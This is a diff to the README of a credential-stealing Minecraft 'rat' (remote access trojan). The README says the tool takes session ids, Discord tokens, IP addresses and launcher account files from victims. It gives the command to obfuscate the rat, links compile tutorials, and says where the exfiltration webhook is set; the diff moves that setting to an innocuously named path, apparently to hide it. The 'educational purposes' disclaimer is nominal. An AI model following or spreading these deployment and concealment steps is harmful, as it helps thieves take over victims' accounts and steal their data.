@@ -3,7 +3,7 @@
 #### if your silly add my friend Bogdi#7137 on discord. i got termed
 ## SCROLL THROUGH THE ENTIRE GITHUB REPO IF U WANT TO KNOW HOW TO COMPILE.
 # OBFUSCATE IT U STUPID DUMBY https://github.com/skidfuscatordev/skidfuscator-java-obfuscator/ 
-## To use this obfuscator. Download it, open command prompt. Type "java -jar [drag skidfus into cmd] obfuscate [drag in rat]" then press enter. optional: if you put in your own code put a space at the end and type "-fuckit" 
+## To use this obfuscator. Download it, open command prompt. Type "java -jar [drag skidfus into cmd] obfuscate [drag in rat]" then press enter.
 ## OBFUSCATION TUTORIAL: https://youtu.be/QziVWrTdpbQ
 ## This is purely for educational purposes
 #### The rat steals Minecraft session id, Discord token, IP and certain files on the victims computer including essentials, feather and lunar accounts
@@ -12,7 +12,7 @@
 ![files](https://cdn.discordapp.com/attachments/950469499818242091/1067490558341283860/beamedL2.png)
 
 ### you can change the webhook in the file directory: 
-## src/main/java/github/quantizr/autogg/guis/gui
+## src/main/java/json/jsonrareexception
 
 ## HERE IS A TUTORIAL ON HOW TO COMPILE: https://youtu.be/YGz_75Zl-ZA
 ### Tutorial video was made by ifallious#0007
